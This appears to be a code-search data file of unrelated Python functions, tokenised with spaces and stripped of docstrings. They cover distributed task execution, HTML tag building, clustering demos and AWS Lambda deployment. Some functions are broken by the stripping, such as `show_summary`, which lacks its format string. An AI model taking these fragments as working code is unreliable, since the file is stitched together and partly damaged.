def system ( cmd , data = None ) : import subprocess s = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stdin = subprocess . PIPE ) out , err = s . communicate ( data ) return out . decode ( 'utf8' )
def unescape ( data ) : cc = re . compile ( r'&(?:(?:#(\d+))|([^;]+));' ) result = [ ] m = cc . search ( data ) while m : result . append ( data [ 0 : m . start ( ) ] ) d = m . group ( 1 ) if d : d = int ( d ) result . append ( unichr ( d ) ) else : d = _unescape . get ( m . group ( 2 ) , ord ( '?' ) ) result . append ( unichr ( d ) ) data = data [ m . end ( ) : ] m = cc . search ( data ) result . append ( data ) return '' . join ( result )
def attr ( * args , * * kwargs ) : ctx = dom_tag . _with_contexts [ _get_thread_context ( ) ] if ctx and ctx [ - 1 ] : dicts = args + ( kwargs , ) for d in dicts : for attr , value in d . items ( ) : ctx [ - 1 ] . tag . set_attribute ( * dom_tag . clean_pair ( attr , value ) ) else : raise ValueError ( 'not in a tag context' )
def set_attribute ( self , key , value ) : if isinstance ( key , int ) : self . children [ key ] = value elif isinstance ( key , basestring ) : self . attributes [ key ] = value else : raise TypeError ( 'Only integer and string types are valid for assigning ' 'child tags and attributes, respectively.' )
def add ( self , * args ) : for obj in args : if isinstance ( obj , numbers . Number ) : # Convert to string so we fall into next if block obj = str ( obj ) if isinstance ( obj , basestring ) : obj = escape ( obj ) self . children . append ( obj ) elif isinstance ( obj , dom_tag ) : ctx = dom_tag . _with_contexts [ _get_thread_context ( ) ] if ctx and ctx [ - 1 ] : ctx [ - 1 ] . used . add ( obj ) self . children . append ( obj ) obj . parent = self obj . setdocument ( self . document ) elif isinstance ( obj , dict ) : for attr , value in obj . items ( ) : self . set_attribute ( * dom_tag . clean_pair ( attr , value ) ) elif hasattr ( obj , '__iter__' ) : for subobj in obj : self . add ( subobj ) else : # wtf is it? raise ValueError ( '%r not a tag or string.' % obj ) if len ( args ) == 1 : return args [ 0 ] return args
def start ( self ) : self . outgoing_q = zmq_pipes . TasksOutgoing ( "127.0.0.1" , self . interchange_port_range ) self . incoming_q = zmq_pipes . ResultsIncoming ( "127.0.0.1" , self . interchange_port_range ) self . is_alive = True self . _queue_management_thread = None self . _start_queue_management_thread ( ) self . _start_local_queue_process ( ) logger . debug ( "Created management thread: {}" . format ( self . _queue_management_thread ) ) if self . provider : # debug_opts = "--debug" if self.worker_debug else "" l_cmd = self . launch_cmd . format ( # debug=debug_opts, task_url = self . worker_task_url , workers_per_node = self . workers_per_node , logdir = "{}/{}" . format ( self . run_dir , self . label ) ) self . launch_cmd = l_cmd logger . debug ( "Launch command: {}" . format ( self . launch_cmd ) ) self . _scaling_enabled = self . provider . scaling_enabled logger . debug ( "Starting LowLatencyExecutor with provider:\n%s" , self . provider ) if hasattr ( self . provider , 'init_blocks' ) : try : for i in range ( self . provider . init_blocks ) : block = self . provider . submit ( self . launch_cmd , 1 , self . workers_per_node ) logger . debug ( "Launched block {}:{}" . format ( i , block ) ) if not block : raise ( ScalingFailed ( self . provider . label , "Attempts to provision nodes via provider has failed" ) ) self . blocks . extend ( [ block ] ) except Exception as e : logger . error ( "Scaling out failed: {}" . format ( e ) ) raise e else : self . _scaling_enabled = False logger . debug ( "Starting LowLatencyExecutor with no provider" )
def create_reg_message ( self ) : msg = { 'parsl_v' : PARSL_VERSION , 'python_v' : "{}.{}.{}" . format ( sys . version_info . major , sys . version_info . minor , sys . version_info . micro ) , 'os' : platform . system ( ) , 'hname' : platform . node ( ) , 'dir' : os . getcwd ( ) , } b_msg = json . dumps ( msg ) . encode ( 'utf-8' ) return b_msg
def heartbeat ( self ) : heartbeat = ( HEARTBEAT_CODE ) . to_bytes ( 4 , "little" ) r = self . task_incoming . send ( heartbeat ) logger . debug ( "Return from heartbeat : {}" . format ( r ) )
def async_process ( fn ) : def run ( * args , * * kwargs ) : proc = mp . Process ( target = fn , args = args , kwargs = kwargs ) proc . start ( ) return proc return run
def send_UDP_message ( self , message ) : x = 0 if self . tracking_enabled : try : proc = udp_messenger ( self . domain_name , self . UDP_IP , self . UDP_PORT , self . sock_timeout , message ) self . procs . append ( proc ) except Exception as e : logger . debug ( "Usage tracking failed: {}" . format ( e ) ) else : x = - 1 return x
def _create_task_log_info ( self , task_id , fail_mode = None ) : info_to_monitor = [ 'func_name' , 'fn_hash' , 'memoize' , 'checkpoint' , 'fail_count' , 'fail_history' , 'status' , 'id' , 'time_submitted' , 'time_returned' , 'executor' ] task_log_info = { "task_" + k : self . tasks [ task_id ] [ k ] for k in info_to_monitor } task_log_info [ 'run_id' ] = self . run_id task_log_info [ 'timestamp' ] = datetime . datetime . now ( ) task_log_info [ 'task_status_name' ] = self . tasks [ task_id ] [ 'status' ] . name task_log_info [ 'tasks_failed_count' ] = self . tasks_failed_count task_log_info [ 'tasks_completed_count' ] = self . tasks_completed_count task_log_info [ 'task_inputs' ] = str ( self . tasks [ task_id ] [ 'kwargs' ] . get ( 'inputs' , None ) ) task_log_info [ 'task_outputs' ] = str ( self . tasks [ task_id ] [ 'kwargs' ] . get ( 'outputs' , None ) ) task_log_info [ 'task_stdin' ] = self . tasks [ task_id ] [ 'kwargs' ] . get ( 'stdin' , None ) task_log_info [ 'task_stdout' ] = self . tasks [ task_id ] [ 'kwargs' ] . get ( 'stdout' , None ) task_log_info [ 'task_depends' ] = None if self . tasks [ task_id ] [ 'depends' ] is not None : task_log_info [ 'task_depends' ] = "," . join ( [ str ( t . _tid ) for t in self . tasks [ task_id ] [ 'depends' ] ] ) task_log_info [ 'task_elapsed_time' ] = None if self . tasks [ task_id ] [ 'time_returned' ] is not None : task_log_info [ 'task_elapsed_time' ] = ( self . tasks [ task_id ] [ 'time_returned' ] - self . tasks [ task_id ] [ 'time_submitted' ] ) . total_seconds ( ) if fail_mode is not None : task_log_info [ 'task_fail_mode' ] = fail_mode return task_log_info
def _command_server ( self , kill_event ) : logger . debug ( "[COMMAND] Command Server Starting" ) while not kill_event . is_set ( ) : try : command_req = self . command_channel . recv_pyobj ( ) logger . debug ( "[COMMAND] Received command request: {}" . format ( command_req ) ) if command_req == "OUTSTANDING_C" : outstanding = self . pending_task_queue . qsize ( ) for manager in self . _ready_manager_queue : outstanding += len ( self . _ready_manager_queue [ manager ] [ 'tasks' ] ) reply = outstanding elif command_req == "WORKERS" : num_workers = 0 for manager in self . _ready_manager_queue : num_workers += self . _ready_manager_queue [ manager ] [ 'worker_count' ] reply = num_workers elif command_req == "MANAGERS" : reply = [ ] for manager in self . _ready_manager_queue : resp = { 'manager' : manager . decode ( 'utf-8' ) , 'block_id' : self . _ready_manager_queue [ manager ] [ 'block_id' ] , 'worker_count' : self . _ready_manager_queue [ manager ] [ 'worker_count' ] , 'tasks' : len ( self . _ready_manager_queue [ manager ] [ 'tasks' ] ) , 'active' : self . _ready_manager_queue [ manager ] [ 'active' ] } reply . append ( resp ) elif command_req . startswith ( "HOLD_WORKER" ) : cmd , s_manager = command_req . split ( ';' ) manager = s_manager . encode ( 'utf-8' ) logger . info ( "[CMD] Received HOLD_WORKER for {}" . format ( manager ) ) if manager in self . _ready_manager_queue : self . _ready_manager_queue [ manager ] [ 'active' ] = False reply = True else : reply = False elif command_req == "SHUTDOWN" : logger . info ( "[CMD] Received SHUTDOWN command" ) kill_event . set ( ) reply = True else : reply = None logger . debug ( "[COMMAND] Reply: {}" . format ( reply ) ) self . command_channel . send_pyobj ( reply ) except zmq . Again : logger . debug ( "[COMMAND] is alive" ) continue
def get_data_manager ( cls ) : from parsl . dataflow . dflow import DataFlowKernelLoader dfk = DataFlowKernelLoader . dfk ( ) return dfk . executors [ 'data_manager' ]
def _import_mapping ( mapping , original = None ) : #log = get_logger() #log.debug("Importing canning map") for key , value in list ( mapping . items ( ) ) : if isinstance ( key , string_types ) : try : cls = import_item ( key ) except Exception : if original and key not in original : # only message on user-added classes # log.error("canning class not importable: %r", key, exc_info=True) print ( "ERROR: canning class not importable: %r" , key , exc_info = True ) mapping . pop ( key ) else : mapping [ cls ] = mapping . pop ( key )
def can ( obj ) : import_needed = False for cls , canner in iteritems ( can_map ) : if isinstance ( cls , string_types ) : import_needed = True break elif istype ( obj , cls ) : return canner ( obj ) if import_needed : # perform can_map imports, then try again # this will usually only happen once _import_mapping ( can_map , _original_can_map ) return can ( obj ) return obj
def can_dict ( obj ) : if istype ( obj , dict ) : newobj = { } for k , v in iteritems ( obj ) : newobj [ k ] = can ( v ) return newobj else : return obj
def can_sequence ( obj ) : if istype ( obj , sequence_types ) : t = type ( obj ) return t ( [ can ( i ) for i in obj ] ) else : return obj
def unset_logging ( self ) : if self . logger_flag is True : return root_logger = logging . getLogger ( ) for hndlr in root_logger . handlers : if hndlr not in self . prior_loghandlers : hndlr . setLevel ( logging . ERROR ) self . logger_flag = True
def start ( self ) : if self . mode == "manual" : return if self . ipython_dir != '~/.ipython' : self . ipython_dir = os . path . abspath ( os . path . expanduser ( self . ipython_dir ) ) if self . log : stdout = open ( os . path . join ( self . ipython_dir , "{0}.controller.out" . format ( self . profile ) ) , 'w' ) stderr = open ( os . path . join ( self . ipython_dir , "{0}.controller.err" . format ( self . profile ) ) , 'w' ) else : stdout = open ( os . devnull , 'w' ) stderr = open ( os . devnull , 'w' ) try : opts = [ 'ipcontroller' , '' if self . ipython_dir == '~/.ipython' else '--ipython-dir={}' . format ( self . ipython_dir ) , self . interfaces if self . interfaces is not None else '--ip=*' , '' if self . profile == 'default' else '--profile={0}' . format ( self . profile ) , '--reuse' if self . reuse else '' , '--location={}' . format ( self . public_ip ) if self . public_ip else '' , '--port={}' . format ( self . port ) if self . port is not None else '' ] if self . port_range is not None : opts += [ '--HubFactory.hb={0},{1}' . format ( self . hb_ping , self . hb_pong ) , '--HubFactory.control={0},{1}' . format ( self . control_client , self . control_engine ) , '--HubFactory.mux={0},{1}' . format ( self . mux_client , self . mux_engine ) , '--HubFactory.task={0},{1}' . format ( self . task_client , self . task_engine ) ] logger . debug ( "Starting ipcontroller with '{}'" . format ( ' ' . join ( [ str ( x ) for x in opts ] ) ) ) self . proc = subprocess . Popen ( opts , stdout = stdout , stderr = stderr , preexec_fn = os . setsid ) except FileNotFoundError : msg = "Could not find ipcontroller. Please make sure that ipyparallel is installed and available in your env" logger . error ( msg ) raise ControllerError ( msg ) except Exception as e : msg = "IPPController failed to start: {0}" . format ( e ) logger . error ( msg ) raise ControllerError ( msg )
def _nbytes ( buf ) : if isinstance ( buf , memoryview ) : if PY3 : # py3 introduces nbytes attribute return buf . nbytes else : # compute nbytes on py2 size = buf . itemsize for dim in buf . shape : size *= dim return size else : # not a memoryview, raw bytes/ py2 buffer return len ( buf )
def _extract_buffers ( obj , threshold = MAX_BYTES ) : buffers = [ ] if isinstance ( obj , CannedObject ) and obj . buffers : for i , buf in enumerate ( obj . buffers ) : nbytes = _nbytes ( buf ) if nbytes > threshold : # buffer larger than threshold, prevent pickling obj . buffers [ i ] = None buffers . append ( buf ) # buffer too small for separate send, coerce to bytes # because pickling buffer objects just results in broken pointers elif isinstance ( buf , memoryview ) : obj . buffers [ i ] = buf . tobytes ( ) elif isinstance ( buf , buffer ) : obj . buffers [ i ] = bytes ( buf ) return buffers
def _restore_buffers ( obj , buffers ) : if isinstance ( obj , CannedObject ) and obj . buffers : for i , buf in enumerate ( obj . buffers ) : if buf is None : obj . buffers [ i ] = buffers . pop ( 0 )
def initialize_boto_client ( self ) : self . session = self . create_session ( ) self . client = self . session . client ( 'ec2' ) self . ec2 = self . session . resource ( 'ec2' ) self . instances = [ ] self . instance_states = { } self . vpc_id = 0 self . sg_id = 0 self . sn_ids = [ ]
def get_instance_state ( self , instances = None ) : if instances : desc = self . client . describe_instances ( InstanceIds = instances ) else : desc = self . client . describe_instances ( InstanceIds = self . instances ) # pprint.pprint(desc['Reservations'],indent=4) for i in range ( len ( desc [ 'Reservations' ] ) ) : instance = desc [ 'Reservations' ] [ i ] [ 'Instances' ] [ 0 ] self . instance_states [ instance [ 'InstanceId' ] ] = instance [ 'State' ] [ 'Name' ] return self . instance_states
def show_summary ( self ) : self . get_instance_state ( ) status_string = . format ( self . vpc_id , self . sn_ids , self . sg_id , self . instances ) status_string += "\tInstance States:\n\t\t" self . get_instance_state ( ) for state in self . instance_states . keys ( ) : status_string += "Instance ID: {}  State: {}\n\t\t" . format ( state , self . instance_states [ state ] ) status_string += "\n" logger . info ( status_string ) return status_string
def scale_out ( self , blocks = 1 , block_size = 1 ) : self . config [ 'sites.jetstream.{0}' . format ( self . pool ) ] [ 'flavor' ] count = 0 if blocks == 1 : block_id = len ( self . blocks ) self . blocks [ block_id ] = [ ] for instance_id in range ( 0 , block_size ) : instances = self . server_manager . create ( 'parsl-{0}-{1}' . format ( block_id , instance_id ) , # Name self . client . images . get ( '87e08a17-eae2-4ce4-9051-c561d9a54bde' ) , # Image_id self . client . flavors . list ( ) [ 0 ] , min_count = 1 , max_count = 1 , userdata = setup_script . format ( engine_config = self . engine_config ) , key_name = 'TG-MCB090174-api-key' , security_groups = [ 'global-ssh' ] , nics = [ { "net-id" : '724a50cf-7f11-4b3b-a884-cd7e6850e39e' , "net-name" : 'PARSL-priv-net' , "v4-fixed-ip" : '' } ] ) self . blocks [ block_id ] . extend ( [ instances ] ) count += 1 return count
def _status ( self ) : job_id_list = ' ' . join ( self . resources . keys ( ) ) cmd = "condor_q {0} -af:jr JobStatus" . format ( job_id_list ) retcode , stdout , stderr = super ( ) . execute_wait ( cmd ) for line in stdout . strip ( ) . split ( '\n' ) : parts = line . split ( ) job_id = parts [ 0 ] status = translate_table . get ( parts [ 1 ] , 'UNKNOWN' ) self . resources [ job_id ] [ 'status' ] = status
def scale_in ( self , blocks ) : status = dict ( zip ( self . engines , self . provider . status ( self . engines ) ) ) # This works for blocks=0 to_kill = [ engine for engine in status if status [ engine ] == "RUNNING" ] [ : blocks ] if self . provider : r = self . provider . cancel ( to_kill ) else : logger . error ( "No execution provider available" ) r = None return r
def status ( self ) : if self . provider : status = self . provider . status ( self . engines ) else : status = [ ] return status
def shutdown ( self ) : self . is_alive = False logging . debug ( "Waking management thread" ) self . incoming_q . put ( None ) # Wake up the thread self . _queue_management_thread . join ( ) # Force join logging . debug ( "Exiting thread" ) self . worker . join ( ) return True
def notify ( self , event_id ) : self . _event_buffer . extend ( [ event_id ] ) self . _event_count += 1 if self . _event_count >= self . threshold : logger . debug ( "Eventcount >= threshold" ) self . make_callback ( kind = "event" )
def make_callback ( self , kind = None ) : self . _wake_up_time = time . time ( ) + self . interval self . callback ( * self . cb_args )
def _create_deployment ( self , deployment ) : api_response = self . kube_client . create_namespaced_deployment ( body = deployment , namespace = self . namespace ) logger . debug ( "Deployment created. status='{0}'" . format ( str ( api_response . status ) ) )
def start ( self ) : self . outgoing_q = zmq_pipes . TasksOutgoing ( "127.0.0.1" , self . interchange_port_range ) self . incoming_q = zmq_pipes . ResultsIncoming ( "127.0.0.1" , self . interchange_port_range ) self . command_client = zmq_pipes . CommandClient ( "127.0.0.1" , self . interchange_port_range ) self . is_alive = True self . _executor_bad_state = threading . Event ( ) self . _executor_exception = None self . _queue_management_thread = None self . _start_queue_management_thread ( ) self . _start_local_queue_process ( ) logger . debug ( "Created management thread: {}" . format ( self . _queue_management_thread ) ) if self . provider : self . initialize_scaling ( ) else : self . _scaling_enabled = False logger . debug ( "Starting HighThroughputExecutor with no provider" )
def status ( self ) : status = [ ] if self . provider : status = self . provider . status ( self . blocks . values ( ) ) return status
def thirteen_oscillator_three_stimulated_ensembles_list ( ) : "Not accurate due to false skipes are observed" parameters = legion_parameters ( ) parameters . Wt = 4.0 parameters . fi = 10.0 template_dynamic_legion ( 15 , 1000 , 1000 , conn_type = conn_type . LIST_BIDIR , stimulus = [ 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 1 ] , params = parameters , separate_repr = [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 , 9 , 10 ] , [ 6 , 7 , 8 ] , [ 11 , 12 , 13 , 14 ] ] )
def thirteen_simplify_oscillator_three_stimulated_ensembles_list ( ) : "Not accurate due to false skipes are observed" parameters = legion_parameters ( ) parameters . Wt = 4.0 parameters . fi = 0.8 parameters . ENABLE_POTENTIONAL = False template_dynamic_legion ( 15 , 1000 , 1000 , conn_type = conn_type . LIST_BIDIR , stimulus = [ 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 1 ] , params = parameters , separate_repr = [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 , 9 , 10 ] , [ 6 , 7 , 8 ] , [ 11 , 12 , 13 , 14 ] ] )
def sixteen_oscillator_two_stimulated_ensembles_grid ( ) : parameters = legion_parameters ( ) parameters . teta_x = - 1.1 template_dynamic_legion ( 16 , 2000 , 1500 , conn_type = conn_type . GRID_FOUR , params = parameters , stimulus = [ 1 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 ] )
def cluster_sample1 ( ) : start_centers = [ [ 3.7 , 5.5 ] ] template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE1 , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE1 , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_sample2 ( ) : start_centers = [ [ 3.5 , 4.8 ] , [ 2.6 , 2.5 ] ] template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE2 , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE2 , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_sample3 ( ) : start_centers = [ [ 0.2 , 0.1 ] , [ 4.0 , 1.0 ] ] template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE3 , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE3 , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_sample5 ( ) : start_centers = [ [ 0.0 , 1.0 ] , [ 0.0 , 0.0 ] ] template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE5 , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_SIMPLE5 , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_elongate ( ) : start_centers = [ [ 1.0 , 4.5 ] , [ 3.1 , 2.7 ] ] template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_ELONGATE , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , SIMPLE_SAMPLES . SAMPLE_ELONGATE , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_lsun ( ) : start_centers = [ [ 1.0 , 3.5 ] , [ 2.0 , 0.5 ] , [ 3.0 , 3.0 ] ] template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_LSUN , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_LSUN , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_target ( ) : start_centers = [ [ 0.2 , 0.2 ] , [ 0.0 , - 2.0 ] , [ 3.0 , - 3.0 ] , [ 3.0 , 3.0 ] , [ - 3.0 , 3.0 ] , [ - 3.0 , - 3.0 ] ] template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_TARGET , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_TARGET , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_two_diamonds ( ) : start_centers = [ [ 0.8 , 0.2 ] ] template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_TWO_DIAMONDS , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_TWO_DIAMONDS , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def cluster_hepta ( ) : start_centers = [ [ 0.0 , 0.0 , 0.0 ] , [ 3.0 , 0.0 , 0.0 ] , [ - 2.0 , 0.0 , 0.0 ] , [ 0.0 , 3.0 , 0.0 ] , [ 0.0 , - 3.0 , 0.0 ] , [ 0.0 , 0.0 , 2.5 ] ] template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_HEPTA , criterion = splitting_type . BAYESIAN_INFORMATION_CRITERION ) template_clustering ( start_centers , FCPS_SAMPLES . SAMPLE_HEPTA , criterion = splitting_type . MINIMUM_NOISELESS_DESCRIPTION_LENGTH )
def get_role_name ( region , account_id , role ) : prefix = ARN_PREFIXES . get ( region , 'aws' ) return 'arn:{0}:iam::{1}:role/{2}' . format ( prefix , account_id , role )
def get_account_id ( profile_name , aws_access_key_id , aws_secret_access_key , region = None , ) : client = get_client ( 'sts' , profile_name , aws_access_key_id , aws_secret_access_key , region , ) return client . get_caller_identity ( ) . get ( 'Account' )
def get_client ( client , profile_name , aws_access_key_id , aws_secret_access_key , region = None , ) : boto3 . setup_default_session ( profile_name = profile_name , aws_access_key_id = aws_access_key_id , aws_secret_access_key = aws_secret_access_key , region_name = region , ) return boto3 . client ( client )
def create_function ( cfg , path_to_zip_file , use_s3 = False , s3_file = None ) : print ( 'Creating your new Lambda function' ) byte_stream = read ( path_to_zip_file , binary_file = True ) profile_name = cfg . get ( 'profile' ) aws_access_key_id = cfg . get ( 'aws_access_key_id' ) aws_secret_access_key = cfg . get ( 'aws_secret_access_key' ) account_id = get_account_id ( profile_name , aws_access_key_id , aws_secret_access_key , cfg . get ( 'region' , ) , ) role = get_role_name ( cfg . get ( 'region' ) , account_id , cfg . get ( 'role' , 'lambda_basic_execution' ) , ) client = get_client ( 'lambda' , profile_name , aws_access_key_id , aws_secret_access_key , cfg . get ( 'region' ) , ) # Do we prefer development variable over config? buck_name = ( os . environ . get ( 'S3_BUCKET_NAME' ) or cfg . get ( 'bucket_name' ) ) func_name = ( os . environ . get ( 'LAMBDA_FUNCTION_NAME' ) or cfg . get ( 'function_name' ) ) print ( 'Creating lambda function with name: {}' . format ( func_name ) ) if use_s3 : kwargs = { 'FunctionName' : func_name , 'Runtime' : cfg . get ( 'runtime' , 'python2.7' ) , 'Role' : role , 'Handler' : cfg . get ( 'handler' ) , 'Code' : { 'S3Bucket' : '{}' . format ( buck_name ) , 'S3Key' : '{}' . format ( s3_file ) , } , 'Description' : cfg . get ( 'description' , '' ) , 'Timeout' : cfg . get ( 'timeout' , 15 ) , 'MemorySize' : cfg . get ( 'memory_size' , 512 ) , 'VpcConfig' : { 'SubnetIds' : cfg . get ( 'subnet_ids' , [ ] ) , 'SecurityGroupIds' : cfg . get ( 'security_group_ids' , [ ] ) , } , 'Publish' : True , } else : kwargs = { 'FunctionName' : func_name , 'Runtime' : cfg . get ( 'runtime' , 'python2.7' ) , 'Role' : role , 'Handler' : cfg . get ( 'handler' ) , 'Code' : { 'ZipFile' : byte_stream } , 'Description' : cfg . get ( 'description' , '' ) , 'Timeout' : cfg . get ( 'timeout' , 15 ) , 'MemorySize' : cfg . get ( 'memory_size' , 512 ) , 'VpcConfig' : { 'SubnetIds' : cfg . get ( 'subnet_ids' , [ ] ) , 'SecurityGroupIds' : cfg . get ( 'security_group_ids' , [ ] ) , } , 'Publish' : True , } if 'tags' in cfg : kwargs . update ( Tags = { key : str ( value ) for key , value in cfg . get ( 'tags' ) . items ( ) } ) if 'environment_variables' in cfg : kwargs . update ( Environment = { 'Variables' : { key : get_environment_variable_value ( value ) for key , value in cfg . get ( 'environment_variables' ) . items ( ) } , } , ) client . create_function ( * * kwargs ) concurrency = get_concurrency ( cfg ) if concurrency > 0 : client . put_function_concurrency ( FunctionName = func_name , ReservedConcurrentExecutions = concurrency )
def update_function ( cfg , path_to_zip_file , existing_cfg , use_s3 = False , s3_file = None , preserve_vpc = False ) : print ( 'Updating your Lambda function' ) byte_stream = read ( path_to_zip_file , binary_file = True ) profile_name = cfg . get ( 'profile' ) aws_access_key_id = cfg . get ( 'aws_access_key_id' ) aws_secret_access_key = cfg . get ( 'aws_secret_access_key' ) account_id = get_account_id ( profile_name , aws_access_key_id , aws_secret_access_key , cfg . get ( 'region' , ) , ) role = get_role_name ( cfg . get ( 'region' ) , account_id , cfg . get ( 'role' , 'lambda_basic_execution' ) , ) client = get_client ( 'lambda' , profile_name , aws_access_key_id , aws_secret_access_key , cfg . get ( 'region' ) , ) # Do we prefer development variable over config? buck_name = ( os . environ . get ( 'S3_BUCKET_NAME' ) or cfg . get ( 'bucket_name' ) ) if use_s3 : client . update_function_code ( FunctionName = cfg . get ( 'function_name' ) , S3Bucket = '{}' . format ( buck_name ) , S3Key = '{}' . format ( s3_file ) , Publish = True , ) else : client . update_function_code ( FunctionName = cfg . get ( 'function_name' ) , ZipFile = byte_stream , Publish = True , ) kwargs = { 'FunctionName' : cfg . get ( 'function_name' ) , 'Role' : role , 'Runtime' : cfg . get ( 'runtime' ) , 'Handler' : cfg . get ( 'handler' ) , 'Description' : cfg . get ( 'description' , '' ) , 'Timeout' : cfg . get ( 'timeout' , 15 ) , 'MemorySize' : cfg . get ( 'memory_size' , 512 ) , } if preserve_vpc : kwargs [ 'VpcConfig' ] = existing_cfg . get ( 'Configuration' , { } ) . get ( 'VpcConfig' ) if kwargs [ 'VpcConfig' ] is None : kwargs [ 'VpcConfig' ] = { 'SubnetIds' : cfg . get ( 'subnet_ids' , [ ] ) , 'SecurityGroupIds' : cfg . get ( 'security_group_ids' , [ ] ) , } else : del kwargs [ 'VpcConfig' ] [ 'VpcId' ] else : kwargs [ 'VpcConfig' ] = { 'SubnetIds' : cfg . get ( 'subnet_ids' , [ ] ) , 'SecurityGroupIds' : cfg . get ( 'security_group_ids' , [ ] ) , } if 'environment_variables' in cfg : kwargs . update ( Environment = { 'Variables' : { key : str ( get_environment_variable_value ( value ) ) for key , value in cfg . get ( 'environment_variables' ) . items ( ) } , } , ) ret = client . update_function_configuration ( * * kwargs ) concurrency = get_concurrency ( cfg ) if concurrency > 0 : client . put_function_concurrency ( FunctionName = cfg . get ( 'function_name' ) , ReservedConcurrentExecutions = concurrency ) elif 'Concurrency' in existing_cfg : client . delete_function_concurrency ( FunctionName = cfg . get ( 'function_name' ) ) if 'tags' in cfg : tags = { key : str ( value ) for key , value in cfg . get ( 'tags' ) . items ( ) } if tags != existing_cfg . get ( 'Tags' ) : if existing_cfg . get ( 'Tags' ) : client . untag_resource ( Resource = ret [ 'FunctionArn' ] , TagKeys = list ( existing_cfg [ 'Tags' ] . keys ( ) ) ) client . tag_resource ( Resource = ret [ 'FunctionArn' ] , Tags = tags )
def upload_s3 ( cfg , path_to_zip_file , * use_s3 ) : print ( 'Uploading your new Lambda function' ) profile_name = cfg . get ( 'profile' ) aws_access_key_id = cfg . get ( 'aws_access_key_id' ) aws_secret_access_key = cfg . get ( 'aws_secret_access_key' ) client = get_client ( 's3' , profile_name , aws_access_key_id , aws_secret_access_key , cfg . get ( 'region' ) , ) byte_stream = b'' with open ( path_to_zip_file , mode = 'rb' ) as fh : byte_stream = fh . read ( ) s3_key_prefix = cfg . get ( 's3_key_prefix' , '/dist' ) checksum = hashlib . new ( 'md5' , byte_stream ) . hexdigest ( ) timestamp = str ( time . time ( ) ) filename = '{prefix}{checksum}-{ts}.zip' . format ( prefix = s3_key_prefix , checksum = checksum , ts = timestamp , ) # Do we prefer development variable over config? buck_name = ( os . environ . get ( 'S3_BUCKET_NAME' ) or cfg . get ( 'bucket_name' ) ) func_name = ( os . environ . get ( 'LAMBDA_FUNCTION_NAME' ) or cfg . get ( 'function_name' ) ) kwargs = { 'Bucket' : '{}' . format ( buck_name ) , 'Key' : '{}' . format ( filename ) , 'Body' : byte_stream , } client . put_object ( * * kwargs ) print ( 'Finished uploading {} to S3 bucket {}' . format ( func_name , buck_name ) ) if use_s3 : return filename
def get_function_config ( cfg ) : function_name = cfg . get ( 'function_name' ) profile_name = cfg . get ( 'profile' ) aws_access_key_id = cfg . get ( 'aws_access_key_id' ) aws_secret_access_key = cfg . get ( 'aws_secret_access_key' ) client = get_client ( 'lambda' , profile_name , aws_access_key_id , aws_secret_access_key , cfg . get ( 'region' ) , ) try : return client . get_function ( FunctionName = function_name ) except client . exceptions . ResourceNotFoundException as e : if 'Function not found' in str ( e ) : return False
def _CCompiler_spawn_silent ( cmd , dry_run = None ) : proc = Popen ( cmd , stdout = PIPE , stderr = PIPE ) out , err = proc . communicate ( ) if proc . returncode : raise DistutilsExecError ( err )
def iter_cython ( path ) : for dir_path , dir_names , file_names in os . walk ( path ) : for file_name in file_names : if file_name . startswith ( '.' ) : continue if os . path . splitext ( file_name ) [ 1 ] not in ( '.pyx' , '.pxd' ) : continue yield os . path . join ( dir_path , file_name )
def split_grafs ( lines ) : graf = [ ] for line in lines : line = line . strip ( ) if len ( line ) < 1 : if len ( graf ) > 0 : yield "\n" . join ( graf ) graf = [ ] else : graf . append ( line ) if len ( graf ) > 0 : yield "\n" . join ( graf )
